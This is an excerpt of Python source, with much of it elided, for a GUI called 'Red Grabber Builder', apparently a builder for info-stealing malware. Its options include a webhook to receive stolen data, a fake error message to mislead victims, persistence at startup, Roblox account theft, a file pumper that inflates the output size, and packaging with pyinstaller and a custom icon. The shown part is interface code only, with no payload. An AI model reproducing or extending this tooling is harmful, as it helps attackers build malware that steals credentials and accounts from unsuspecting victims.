...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("Red Grabber Builder")
        ...
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "red.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "red.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "red.png")), size=(20, 20))
        ...
        self.credit = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "credit.png")), size=(30, 30))
        self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}red.ico")

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="  Red Grabber Builder", image=self.logo_image,
        ...
        self.frame_2_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Help-me", font=customtkinter.CTkFont(
        ...
        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#c31111", hover_color="#f04141", font=customtkinter.CTkFont(size=15, family=self.font))
        ...
        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#c31111", hover_color="#f04141")
        ...
        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#c31111", hover_color="#f04141")
        ...
        self.pingtype = customtkinter.CTkOptionMenu(
            ...
            fg_color="#c31111", button_hover_color="#f04141", button_color="#990b1e")
        ...
        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#c31111", hover_color="#f04141")
        ...
        self.startup = customtkinter.CTkCheckBox(
            ...
            fg_color="#c31111", hover_color="#f04141")
        ...
        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#c31111", hover_color="#f04141", command=self.check_roblox)
        ...
        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#c31111", hover_color="#f04141", command=self.check_pumper)
        ...
        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#c31111", button_hover_color="#f04141", button_color="#990b1e")
        ...
        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", ".py"],
                                                    ...
                                                    fg_color="#c31111", button_hover_color="#f04141", button_color="#990b1e", command=self.multi_commands)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#c31111", hover_color="#f04141",
        ...
        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#c31111", hover_color="#f04141", command=self.buildfile)
    ...
    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#c31111", hover_color="#f04141",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
    ...
    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#c31111", hover_color="#f04141", text="Check Webhook")
    ...
    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#c31111", hover_color="#f04141")
                time.sleep(0.3)
                self.update()
    ...
    def get_config(self):
        try:
            with open(self.basefilepath + "\\Red.py", 'r', encoding="utf-8") as f:
                code = f.read()
            ...
            if config_match:
                ...
                raise Exception("Could not find config in Red.py")
